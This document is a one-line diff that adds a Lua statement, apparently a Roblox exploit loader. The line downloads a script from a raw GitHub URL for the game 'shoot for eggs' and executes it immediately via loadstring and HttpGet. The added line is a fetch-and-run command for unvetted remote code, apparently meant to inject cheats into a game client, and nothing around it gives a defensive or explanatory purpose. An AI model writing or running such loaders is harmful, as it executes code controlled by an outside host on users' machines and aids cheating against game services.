@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/shoot-for-eggs-spam0-a92meryxjfazto.lua"))()
